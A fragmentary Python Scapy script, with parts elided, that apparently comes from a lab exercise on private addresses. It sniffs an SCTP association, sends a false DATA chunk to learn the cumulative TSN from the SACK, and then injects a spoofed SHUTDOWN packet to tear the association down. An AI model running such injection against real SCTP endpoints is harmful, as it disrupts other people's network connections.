...
# Function to check if a packet is an SCTP HEARTBEAT from Node C to Node S
...
# Function to check if a packet is an SCTP SACK from Node S to Node C
def is_sack_packet(pkt):
    return ((SCTP in pkt) and
            (SCTPChunkSACK in pkt) and
            (pkt[IP].src == "10.10.10.155") and
            (pkt[IP].dst == "10.10.10.7"))


# Función de callback para procesar paquetes capturados
def process_packet(pkt):
    if SCTP in pkt: 
        captured_packets.append(pkt)
    if SCTPChunkSACK in pkt:
        tsn_ack = pkt[SCTPChunkSACK].tsn_ack
        print(f"TSN ACK recibido: {tsn_ack}")
...
# Step 2: We need to send a SCTPchunkDataDATA to obtain cumulative TSN
...
# Starting sniffing before ChunkDATA sending 
sniffer_thread = AsyncSniffer(iface="enp0s8", filter="sctp", prn=process_packet, count=4)
sniffer_thread.start()
sendp(send_data_pkt, verbose=False, iface="enp0s8")
print("False Data packet sent.\n")
sniffer_thread.join()

#print("Monitoring network for SCTP SACK packet from 10.10.10.155 to 10.10.10.7...")
#packet_sack = sniff(iface="enp0s8", filter="sctp", prn=lambda x: x, stop_filter=is_heartbeat_packet, count=1)
#packet_sack[0].show()
#tsn = packet_sack[0].cumul_tsn_ack
#print(f"TSN = {tsn}")

# Step 3: Construct SCTP SHUTDOWN packet

for pkt in captured_packets:
    pkt.show()
    if SCTPChunkSACK in pkt:
       tsn = pkt[SCTPChunkSACK].cumul_tsn_ack
       print(f"TSN ACK en paquete capturado: {tsn}")
...
shutdown_pkt = (
    ...
    SCTPChunkShutdown(cumul_tsn_ack = tsn)
    #SCTPChunkData()
)
...
print("\nSending SHUTDOWN packet to Node S (10.10.10.155)...")

for i in range(1, 2):
    sendp(shutdown_pkt, verbose=False, iface="enp0s8")
    print(f"{i} - SHUTDOWN packet sent.\n")
    time.sleep(2)